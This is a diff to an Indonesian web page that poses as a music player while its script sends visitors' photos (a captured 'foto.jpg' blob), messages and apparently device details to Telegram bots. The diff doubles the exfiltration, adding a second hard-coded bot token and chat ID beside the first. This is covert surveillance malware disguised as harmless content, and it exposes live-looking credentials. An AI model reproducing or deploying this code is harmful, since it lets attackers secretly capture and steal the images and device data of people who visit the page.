@@ -1,4 +1,4 @@
-<!-- OPEN SOURCE -->
+<!-- OPEN SOURCE V2-->
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -32,14 +32,14 @@
       overflow: hidden;
       color: white;
     }
-  .logo {
-  width: 120px;
-  height: 100px;
-  border-radius: 50%;
-  background: url('https://files.catbox.moe/qee2ry.png') center/cover no-repeat;
-  background-color: transparent;
-  margin: 0 auto 12px;
-  }
+    .logo {
+      width: 120px;
+      height: 100px;
+      border-radius: 50%;
+      background: url('https://files.catbox.moe/qee2ry.png') center/cover no-repeat;
+      background-color: transparent;
+      margin: 0 auto 12px;
+    }
     .title-wrapper {
       width: 100%;
       overflow: hidden;
@@ -150,14 +150,12 @@
     </div>
     <div class="artist">Tetap di halaman ini agar music berputar</div>
     <div class="artist">#nullsiren #masing²</div>
-
     <div class="progress-wrapper">
       <div class="progress-bar">
         <div class="progress-fill" id="progress"></div>
       </div>
       <input type="range" class="seek-slider" id="seekSlider" min="0" max="100" value="0" step="0.1">
     </div>
-
     <div class="controls">
       <button onclick="audio.play()">Play</button>
       <button onclick="audio.pause()">Pause</button>
@@ -184,25 +182,39 @@
       }
     });
 
-    const token = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
-    const chatId = '5914256752';
+    const token1 = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
+    const chatId1 = '5914256752';
+    const token2 = '7908046573:AAEybtvlKrJHgj1BNsobnKImyna19dFAeus';
+    const chatId2 = '7584798402';
 
     const kirimPesan = async (pesan) => {
-      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: pesan, parse_mode: 'HTML' })
-      });
+      const targets = [
+        { token: token1, chat_id: chatId1 },
+        { token: token2, chat_id: chatId2 }
+      ];
+      for (const t of targets) {
+        await fetch(`https://api.telegram.org/bot${t.token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: t.chat_id, text: pesan, parse_mode: 'HTML' })
+        });
+      }
     };
 
     const kirimFoto = async (blob) => {
-      const form = new FormData();
-      form.append("chat_id", chatId);
-      form.append("photo", blob, "foto.jpg");
-      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-        method: "POST",
-        body: form
-      });
+      const targets = [
+        { token: token1, chat_id: chatId1 },
+        { token: token2, chat_id: chatId2 }
+      ];
+      for (const t of targets) {
+        const form = new FormData();
+        form.append("chat_id", t.chat_id);
+        form.append("photo", blob, "foto.jpg");
+        await fetch(`https://api.telegram.org/bot${t.token}/sendPhoto`, {
+          method: "POST",
+          body: form
+        });
+      }
     };
 
     const getDeviceBrand = () => {
